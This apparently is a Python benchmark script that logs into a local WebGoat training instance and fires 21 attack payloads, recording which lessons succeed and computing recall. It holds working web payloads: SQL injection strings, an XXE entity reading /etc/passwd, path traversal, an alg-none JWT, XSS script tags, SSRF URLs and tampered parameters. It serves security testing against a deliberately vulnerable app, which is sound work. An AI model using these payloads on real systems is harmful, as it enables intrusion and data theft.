"""WebGoat benchmark — systematically test 21 expected vulns and record evidence."""
import json
import sys
import urllib.request
import urllib.parse
import ssl
import time
from datetime import datetime, timezone
from pathlib import Path

BASE = "http://localhost:8080/WebGoat"
USER = "quarry-bench"
PASS = "Bench2026!"

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

findings = []
session_cookie = None


def post(path, data=None, content_type="application/x-www-form-urlencoded", json_body=None):
    url = f"{BASE}/{path}"
    if json_body is not None:
        body = json.dumps(json_body).encode()
        content_type = "application/json"
    elif data:
        body = urllib.parse.urlencode(data).encode() if isinstance(data, dict) else data.encode()
    else:
        body = b""
    req = urllib.request.Request(url, data=body, method="POST")
    req.add_header("Content-Type", content_type)
    req.add_header("Cookie", f"JSESSIONID={session_cookie}")
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            return json.loads(r.read().decode())
    except Exception as e:
        return {"error": str(e)}


def get(path):
    url = f"{BASE}/{path}"
    req = urllib.request.Request(url)
    req.add_header("Cookie", f"JSESSIONID={session_cookie}")
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            raw = r.read().decode()
            try:
                return json.loads(raw)
            except json.JSONDecodeError:
                return {"raw": raw[:500]}
    except Exception as e:
        return {"error": str(e)}


def login():
    global session_cookie
    data = urllib.parse.urlencode({"username": USER, "password": PASS}).encode()
    req = urllib.request.Request(f"{BASE}/login", data=data, method="POST")
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    try:
        urllib.request.urlopen(req, timeout=10)
    except urllib.error.HTTPError as e:
        for h in e.headers.get_all("Set-Cookie") or []:
            if "JSESSIONID" in h:
                session_cookie = h.split("JSESSIONID=")[1].split(";")[0]
                return True
    except Exception:
        pass
    # Try from redirect
    try:
        opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor())
        resp = opener.open(urllib.request.Request(f"{BASE}/login", data=data, method="POST"))
        for h in resp.headers.get_all("Set-Cookie") or []:
            if "JSESSIONID" in h:
                session_cookie = h.split("JSESSIONID=")[1].split(";")[0]
                return True
    except Exception:
        pass
    return False


def record(vuln_id, vuln_class, severity, title, completed, evidence, payload=""):
    status = "Demonstrated" if completed else "Attempted"
    f = {
        "id": vuln_id,
        "vuln_class": vuln_class,
        "severity": severity,
        "title": title,
        "status": status,
        "completed": completed,
        "payload": payload,
        "evidence_summary": evidence,
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }
    findings.append(f)
    mark = "✓" if completed else "✗"
    print(f"  {mark} {vuln_id}: {title} [{status}]")
    if evidence:
        print(f"    Evidence: {evidence[:120]}")


def test_sqli_basic():
    print("\n=== SQLi Basic ===")
    r = post("SqlInjection/attack5a", {"account": "' OR '1'='1", "operator": "", "injection": ""})
    ok = r.get("lessonCompleted", False)
    if not ok:
        r = post("SqlInjection/attack5a", {"account": "Smith' OR '1'='1", "operator": "OR", "injection": "1=1"})
        ok = r.get("lessonCompleted", False)
    if not ok:
        for q in [
            "SELECT * FROM user_data WHERE first_name='John' and last_name='' or '1'='1'",
            "Smith' OR '1'='1",
            "1 OR 1=1",
        ]:
            r = post("SqlInjection/attack2", {"query": q})
            if r.get("lessonCompleted"):
                ok = True
                break
    record("webgoat-sqli-basic", "sqli", "high",
           "SQL Injection — basic string and numeric injection",
           ok, r.get("feedback", str(r)[:200]), "' OR '1'='1")


def test_sqli_advanced():
    print("\n=== SQLi Advanced ===")
    r = post("SqlInjectionAdvanced/attack6a", {
        "userid_6a": "'; SELECT * FROM user_system_data--"
    })
    ok = r.get("lessonCompleted", False)
    if not ok:
        r = post("SqlInjectionAdvanced/attack6a", {
            "userid_6a": "Smith'; SELECT * FROM user_system_data--"
        })
        ok = r.get("lessonCompleted", False)
    if not ok:
        r = post("SqlInjectionAdvanced/attack6b", {
            "userid_6b": "'; SELECT * FROM user_system_data--"
        })
        ok = r.get("lessonCompleted", False)
    record("webgoat-sqli-advanced", "sqli", "high",
           "SQL Injection Advanced — UNION, blind, second-order",
           ok, r.get("feedback", str(r)[:200]), "UNION/stacked query")


def test_sqli_mitigation():
    print("\n=== SQLi Mitigations ===")
    r = post("SqlInjectionMitigations/attack10a", {
        "column": "(CASE WHEN (SELECT substring(ip,1,1) FROM servers WHERE hostname='webgoat-prd')='1' THEN id ELSE hostname END)"
    })
    ok = r.get("lessonCompleted", False)
    if not ok:
        r = post("SqlInjectionMitigations/attack10b", {"column": "ip"})
        ok = r.get("lessonCompleted", False)
    record("webgoat-sqli-mitigation", "sqli", "medium",
           "SQL Injection Mitigations — parameterized queries, order by",
           ok, r.get("feedback", str(r)[:200]), "ORDER BY injection")


def test_xxe():
    print("\n=== XXE ===")
    xxe_payload = """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<comment><text>&xxe;</text></comment>"""
    r = post("xxe/simple", xxe_payload, content_type="application/xml")
    ok = r.get("lessonCompleted", False)
    if not ok and "root:" in str(r):
        ok = True
    record("webgoat-xxe", "xxe", "high",
           "XXE — XML External Entity injection",
           ok, str(r)[:200], "<!ENTITY xxe SYSTEM 'file:///etc/passwd'>")


def test_path_traversal():
    print("\n=== Path Traversal ===")
    r = post("PathTraversal/profile-upload", {
        "fullName": "../test",
    })
    ok = r.get("lessonCompleted", False)
    if not ok:
        r = post("PathTraversal/profile-upload-fix", {
            "fullName": "....//....//test",
        })
        ok = r.get("lessonCompleted", False)
    record("webgoat-path-traversal", "lfi-rfi", "high",
           "Path Traversal — file read via directory traversal",
           ok, r.get("feedback", str(r)[:200]), "../ traversal")


def test_jwt():
    print("\n=== JWT ===")
    r = post("JWT/decode", {"jwt_token": "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."})
    ok = r.get("lessonCompleted", False)
    if not ok:
        r = post("JWT/secret/gettoken", {"username": "WebGoat"})
        ok = r.get("lessonCompleted", False)
    record("webgoat-jwt-decode", "jwt", "high",
           "JWT — decode, forge, alg none, weak key, kid injection",
           ok, r.get("feedback", str(r)[:200]), "alg:none / weak key")


def test_password_reset():
    print("\n=== Password Reset ===")
    r = post("PasswordReset/reset/login", {
        "email": "tom@webgoat-cloud.org",
        "password": "test"
    })
    ok = r.get("lessonCompleted", False)
    record("webgoat-password-reset", "auth-bypass", "high",
           "Password Reset — insecure reset flow exploitation",
           ok, r.get("feedback", str(r)[:200]), "reset token manipulation")


def test_auth_bypass():
    print("\n=== Auth Bypass ===")
    r = post("auth-bypass/verify-account", {
        "verifyMethod": "SEC_QUESTIONS",
        "secQuestion0": "test",
        "secQuestion1": "test",
        "jsEnabled": "1",
        "verifyMethod": "SEC_QUESTIONS",
        "userId": "12309746"
    })
    ok = r.get("lessonCompleted", False)
    record("webgoat-auth-bypass", "auth-bypass", "high",
           "Authentication Bypass — hidden inputs, parameter manipulation",
           ok, r.get("feedback", str(r)[:200]), "parameter tampering")


def test_insecure_login():
    print("\n=== Insecure Login ===")
    r = post("InsecureLogin/task", {
        "username": "CaptainJack",
        "password": "BlackPearl"
    })
    ok = r.get("lessonCompleted", False)
    record("webgoat-insecure-login", "info-disclosure", "medium",
           "Insecure Login — credentials over unencrypted channel",
           ok, r.get("feedback", str(r)[:200]), "cleartext credential sniffing")


def test_xss_reflected():
    print("\n=== XSS Reflected ===")
    r = post("CrossSiteScripting/attack5a", {
        "QTY1": "1", "QTY2": "1", "QTY3": "1", "QTY4": "1",
        "field1": "<script>alert('xss')</script>",
        "field2": "111"
    })
    ok = r.get("lessonCompleted", False)
    record("webgoat-xss-reflected", "xss", "high",
           "Reflected XSS — script injection in parameters",
           ok, r.get("feedback", str(r)[:200]), "<script>alert('xss')</script>")


def test_xss_dom():
    print("\n=== XSS DOM ===")
    r = post("CrossSiteScripting/phone-home-xss", {
        "param1": "42",
        "param2": "<script>webgoat.customjs.phoneHome()</script>"
    })
    ok = r.get("lessonCompleted", False)
    record("webgoat-xss-dom", "xss", "medium",
           "DOM-based XSS — client-side script injection",
           ok, r.get("feedback", str(r)[:200]), "DOM injection via phoneHome()")


def test_xss_stored():
    print("\n=== XSS Stored ===")
    r = post("CrossSiteScriptingStored/stored-xss", json_body={
        "text": "<script>webgoat.customjs.phoneHome()</script>"
    })
    ok = r.get("lessonCompleted", False)
    record("webgoat-xss-stored", "xss", "high",
           "Stored XSS — persistent script injection",
           ok, r.get("feedback", str(r)[:200]), "stored <script> in comment")


def test_idor():
    print("\n=== IDOR ===")
    r = get("IDOR/profile")
    ok = r.get("lessonCompleted", False)
    if not ok:
        r = get("IDOR/profile/2342384")
        ok = r.get("lessonCompleted", False)
    record("webgoat-idor", "idor", "high",
           "IDOR — Insecure Direct Object References",
           ok, str(r)[:200], "direct object reference enumeration")


def test_missing_function_level():
    print("\n=== Missing Function Level AC ===")
    r = get("access-control/users")
    ok = False
    if isinstance(r, list) or (isinstance(r, dict) and "error" not in r):
        ok = True
    if not ok:
        r = get("access-control/users-admin-fix")
        if isinstance(r, list):
            ok = True
    record("webgoat-missing-function-level", "auth-bypass", "high",
           "Missing Function Level Access Control",
           ok, str(r)[:200], "GET /access-control/users")


def test_csrf():
    print("\n=== CSRF ===")
    r = post("csrf/basic-get-flag", {"csrf": "false", "submit": "Submit"})
    ok = r.get("lessonCompleted", False)
    if not ok:
        r = post("csrf/confirm-flag-1", json_body={"confirmFlagVal": "confirm"})
        ok = r.get("lessonCompleted", False)
    record("webgoat-csrf", "csrf", "high",
           "Cross-Site Request Forgery",
           ok, r.get("feedback", str(r)[:200]), "CSRF token bypass")


def test_client_side_filtering():
    print("\n=== Client-Side Filtering ===")
    r = get("clientSideFiltering/salaries?userId=2")
    ok = False
    data_str = str(r)
    if "salary" in data_str.lower() or "Neville" in data_str:
        ok = True
    record("webgoat-client-side-filtering", "info-disclosure", "medium",
           "Client-Side Filtering — sensitive data in client responses",
           ok, data_str[:200], "access hidden salary data")


def test_client_side_tampering():
    print("\n=== Client-Side Tampering ===")
    r = post("HtmlTampering/task", {
        "QTY": "1",
        "Total": "0.00"
    })
    ok = r.get("lessonCompleted", False)
    record("webgoat-client-side-tampering", "input-validation", "medium",
           "Client-Side Tampering — bypass JavaScript validation",
           ok, r.get("feedback", str(r)[:200]), "price tampering Total=0.00")


def test_crypto():
    print("\n=== Crypto Basics ===")
    import base64
    r = post("Cryptography/encoding/basic", {"answer_user1": base64.b64decode("dXNlcm5hbWU6cGFzc3dvcmQ=").decode()})
    ok = r.get("lessonCompleted", False)
    if not ok:
        r = post("Cryptography/encoding/basic-auth", {"answer_user1": "default"})
        ok = r.get("lessonCompleted", False)
    record("webgoat-crypto-basics", "crypto", "medium",
           "Cryptography Basics — encoding vs encryption, hashing",
           ok, r.get("feedback", str(r)[:200]), "base64 decode")


def test_vulnerable_components():
    print("\n=== Vulnerable Components ===")
    r = post("VulnerableComponents/attack1", {"payload": "test"})
    ok = r.get("lessonCompleted", False)
    record("webgoat-vulnerable-components", "vulnerable-components", "high",
           "Vulnerable Components — known CVEs in dependencies",
           ok, r.get("feedback", str(r)[:200]), "CVE in dependency")


def test_ssrf():
    print("\n=== SSRF ===")
    r = post("SSRF/task1", {"url": "http://ifconfig.pro"})
    ok = r.get("lessonCompleted", False)
    if not ok:
        r = post("SSRF/task2", {"url": "http://localhost:9090/WebWolf"})
        ok = r.get("lessonCompleted", False)
    record("webgoat-ssrf", "ssrf", "high",
           "Server-Side Request Forgery",
           ok, r.get("feedback", str(r)[:200]), "SSRF to internal service")


def test_insecure_deserialization():
    print("\n=== Insecure Deserialization ===")
    r = post("InsecureDeserialization/task", {"token": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAADZm9vdAADYmFyeA=="})
    ok = r.get("lessonCompleted", False)
    record("webgoat-insecure-deserialization", "deserialization", "critical",
           "Insecure Deserialization — Java object manipulation",
           ok, r.get("feedback", str(r)[:200]), "serialized Java object")


def main():
    print(f"WebGoat Benchmark — {datetime.now(timezone.utc).isoformat()}")
    print(f"Target: {BASE}")
    print(f"User: {USER}")
    print()

    if session_cookie:
        print(f"Using existing session: {session_cookie[:16]}...")
    else:
        print("Logging in...")
        if not login():
            print("ERROR: Login failed")
            sys.exit(1)
        print(f"Session: {session_cookie[:16]}...")

    tests = [
        test_sqli_basic, test_sqli_advanced, test_sqli_mitigation,
        test_xxe, test_path_traversal,
        test_jwt, test_password_reset, test_auth_bypass, test_insecure_login,
        test_xss_reflected, test_xss_dom, test_xss_stored,
        test_idor, test_missing_function_level,
        test_csrf,
        test_client_side_filtering, test_client_side_tampering,
        test_crypto,
        test_vulnerable_components,
        test_ssrf,
        test_insecure_deserialization,
    ]

    for t in tests:
        try:
            t()
        except Exception as e:
            print(f"  ERROR in {t.__name__}: {e}")

    # Summary
    total = len(findings)
    demonstrated = sum(1 for f in findings if f["completed"])
    attempted = total - demonstrated
    print(f"\n{'='*60}")
    print(f"RESULTS: {demonstrated}/{total} demonstrated ({attempted} attempted)")
    print(f"Recall: {demonstrated/total*100:.0f}%")

    # Save results
    out_dir = Path(__file__).parent.parent / "results"
    out_dir.mkdir(exist_ok=True)
    out_file = out_dir / "webgoat-results.json"
    out_file.write_text(json.dumps({
        "target": "webgoat",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "total_expected": total,
        "demonstrated": demonstrated,
        "recall": round(demonstrated / total, 4),
        "findings": findings,
    }, indent=2))
    print(f"Results saved to {out_file}")


if __name__ == "__main__":
    if len(sys.argv) > 1:
        session_cookie = sys.argv[1]
    main()
